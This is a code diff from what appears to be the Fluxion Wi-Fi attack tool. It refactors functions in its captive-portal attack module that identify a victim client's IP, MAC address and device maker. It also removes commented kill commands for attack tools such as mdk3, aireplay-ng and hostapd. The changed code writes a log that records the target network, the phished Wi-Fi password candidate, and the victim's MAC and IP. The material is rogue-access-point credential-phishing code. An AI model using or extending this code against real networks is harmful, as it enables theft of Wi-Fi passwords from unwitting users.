@@ -346,20 +346,19 @@ function captive_portal_unset_attack() {
 	fi
 }
 
-function GetClientIP ()
-{
-	if [ -f "/tmp/fluxspace/ip_hits" ];then 
-		MatchedClientIP=$(cat /tmp/fluxspace/ip_hits | tail -n 1 | head -n 1)
+function captive_portal_get_client_IP() {
+	if [ -f "$FLUXIONWorkspacePath/ip_hits" ]; then
+		MatchedClientIP=$(cat "$FLUXIONWorkspacePath/ip_hits" | tail -n 1 | head -n 1)
 	else
 		MatchedClientIP="unknown"
 	fi
-	
+
 	echo $MatchedClientIP
 }
 
-function GetMacFromIP () {
-	if [ -f "/tmp/fluxspace/ip_hits" ] && [ $(GetClientIP) != "" ];then 
-		IP=$(GetClientIP)
+function captive_portal_get_IP_MAC() {
+	if [ -f "$FLUXIONWorkspacePath/ip_hits" ] && [ $(captive_portal_get_client_IP) != "" ]; then
+		IP=$(captive_portal_get_client_IP)
 		MatchedClientMAC=$(nmap -PR -sn -n $IP 2>&1 | grep -i mac | awk '{print $3}' | tr [:upper:] [:lower:])
 		if [ "$(echo $MatchedClientMAC | wc -m)" != "18" ]; then
 			MatchedClientMAC="xx:xx:xx:xx:xx:xx"
@@ -370,19 +369,18 @@ function GetMacFromIP () {
 	echo $MatchedClientMAC
 }
 
-function GetModelBrand ()
-{
-	if [ $(GetMacFromIP) != "" ];then	
-		VICTIM_FABRICANTE=$(macchanger -l | grep "$(echo "$(GetMacFromIP)" | cut -d ":" -f -3)" | cut -d " " -f 5-)
-		if echo \$MatchedClientMAC| grep -q x; then
-		        VICTIM_FABRICANTE=\"unknown\"
+function captive_portal_get_MAC_brand() {
+    local MACManufacturer=""
+	if [ $(captive_portal_get_IP_MAC) != "" ]; then
+		MACManufacturer=$(macchanger -l | grep "$(echo "$(captive_portal_get_IP_MAC)" | cut -d ":" -f -3)" | cut -d " " -f 5-)
+		if echo "$MACManufacturer" | grep -q x; then
+		        MACManufacturer="unknown"
 		fi
 	else
-		VICTIM_FABRICANTE="unknown"
+		MACManufacturer="unknown"
 	fi
-	
-	echo $VICTIM_FABRICANTE
 
+	echo $MACManufacturer
 }
 
 # Create different settings required for the script
@@ -725,21 +723,6 @@ sleep 3
 
 signal_stop_attack
 
-
-# killall mdk3 &> $FLUXIONOutputDevice
-# killall aireplay-ng &> $FLUXIONOutputDevice
-# killall airbase-ng &> $FLUXIONOutputDevice
-# kill \$(ps a | grep python | grep fluxion_captive_portal_dns.py | awk '{print \$1}') &> $FLUXIONOutputDevice
-# killall hostapd &> $FLUXIONOutputDevice
-# killall lighttpd &> $FLUXIONOutputDevice
-# killall dhcpd &> $FLUXIONOutputDevice
-
-# if [ \"$APRogueAuthMode\" = \"wpa_supplicant\" ]; then
-#	killall wpa_supplicant &> $FLUXIONOutputDevice
-# fi
-
-# killall wpa_passphrase &> $FLUXIONOutputDevice
-
 # Assure we've got a directory to store net logs into.
 if [ ! -d \"$CaptivePortalNetLog\" ]; then
 	mkdir -p \"$CaptivePortalNetLog\"
@@ -754,8 +737,8 @@ Channel: $APTargetChannel
 Security: $APTargetEncryption
 Time: \$ih\$h:\$im\$m:\$is\$s
 Password: \$(cat $FLUXIONWorkspacePath/candidate.txt)
-Mac: $(GetMacFromIP)
-IP: $(GetClientIP)
+Mac: $(captive_portal_get_IP_MAC)
+IP: $(captive_portal_get_client_IP)
 \" >\"$CaptivePortalNetLog/$APTargetSSID-$APTargetMAC.log\"" >> "$FLUXIONWorkspacePath/captive_portal_authenticator.sh"
 
 	if [ $APRogueAuthMode = "hash" ]; then
